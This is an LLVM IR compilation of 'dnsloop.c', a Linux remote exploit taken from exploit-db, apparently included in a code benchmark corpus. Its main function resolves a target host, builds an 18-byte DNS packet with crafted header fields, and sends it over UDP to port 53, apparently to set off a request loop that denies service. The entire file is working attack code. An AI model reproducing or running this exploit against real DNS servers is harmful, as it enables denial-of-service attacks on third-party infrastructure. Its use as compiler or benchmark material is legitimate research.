; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19891.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19891.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [44 x i8] c"dnsloop.c by Hugo Breton (bretonh@pgci.ca)\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"usage: %s host\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"unknown host %s\0A\00", align 1
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"unable to create UDP socket\0A\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"unable to send packet\0A\00", align 1
@.str.5 = private unnamed_addr constant [24 x i8] c"packet sent to host %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [18 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i8* %16)
  store i32 0, i32* %3, align 4
  br label %97

18:                                               ; preds = %2
  %19 = bitcast %struct.sockaddr_in* %8 to i8*
  %20 = call i32 @bzero(i8* %19, i32 24)
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %21, i32* %22, align 8
  %23 = call i8* @htons(i32 53)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i8* %23, i8** %24, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @inet_addr(i8* %27)
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 0
  store i32 %28, i32* %30, align 8
  %31 = icmp eq i32 %28, -1
  br i1 %31, label %32, label %50

32:                                               ; preds = %18
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call %struct.hostent* @gethostbyname(i8* %35)
  store %struct.hostent* %36, %struct.hostent** %9, align 8
  %37 = icmp eq %struct.hostent* %36, null
  br i1 %37, label %38, label %43

38:                                               ; preds = %32
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i8* %41)
  store i32 0, i32* %3, align 4
  br label %97

43:                                               ; preds = %32
  %44 = load %struct.hostent*, %struct.hostent** %9, align 8
  %45 = getelementptr inbounds %struct.hostent, %struct.hostent* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 0
  %49 = call i32 @bcopy(i32 %46, i32* %48, i32 4)
  br label %50

50:                                               ; preds = %43, %18
  %51 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %52 = call i32 @bzero(i8* %51, i32 18)
  %53 = call i8* @htons(i32 -4442)
  %54 = ptrtoint i8* %53 to i16
  %55 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %56 = getelementptr inbounds i8, i8* %55, i64 0
  %57 = bitcast i8* %56 to i16*
  store i16 %54, i16* %57, align 2
  %58 = call i8* @htons(i32 1)
  %59 = ptrtoint i8* %58 to i16
  %60 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %61 = getelementptr inbounds i8, i8* %60, i64 4
  %62 = bitcast i8* %61 to i16*
  store i16 %59, i16* %62, align 2
  %63 = call i8* @htons(i32 49164)
  %64 = ptrtoint i8* %63 to i16
  %65 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %66 = getelementptr inbounds i8, i8* %65, i64 12
  %67 = bitcast i8* %66 to i16*
  store i16 %64, i16* %67, align 2
  %68 = call i8* @htons(i32 1)
  %69 = ptrtoint i8* %68 to i16
  %70 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %71 = getelementptr inbounds i8, i8* %70, i64 14
  %72 = bitcast i8* %71 to i16*
  store i16 %69, i16* %72, align 2
  %73 = call i8* @htons(i32 1)
  %74 = ptrtoint i8* %73 to i16
  %75 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %76 = getelementptr inbounds i8, i8* %75, i64 16
  %77 = bitcast i8* %76 to i16*
  store i16 %74, i16* %77, align 2
  %78 = load i32, i32* @AF_INET, align 4
  %79 = load i32, i32* @SOCK_DGRAM, align 4
  %80 = call i32 @socket(i32 %78, i32 %79, i32 0)
  store i32 %80, i32* %7, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %84

82:                                               ; preds = %50
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %97

84:                                               ; preds = %50
  %85 = load i32, i32* %7, align 4
  %86 = getelementptr inbounds [18 x i8], [18 x i8]* %6, i64 0, i64 0
  %87 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %88 = call i32 @sendto(i32 %85, i8* %86, i32 18, i32 0, %struct.sockaddr* %87, i32 24)
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %92

90:                                               ; preds = %84
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %97

92:                                               ; preds = %84
  %93 = load i8**, i8*** %5, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0), i8* %95)
  store i32 0, i32* %3, align 4
  br label %97

97:                                               ; preds = %92, %90, %82, %38, %13
  %98 = load i32, i32* %3, align 4
  ret i32 %98
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @bcopy(i32, i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
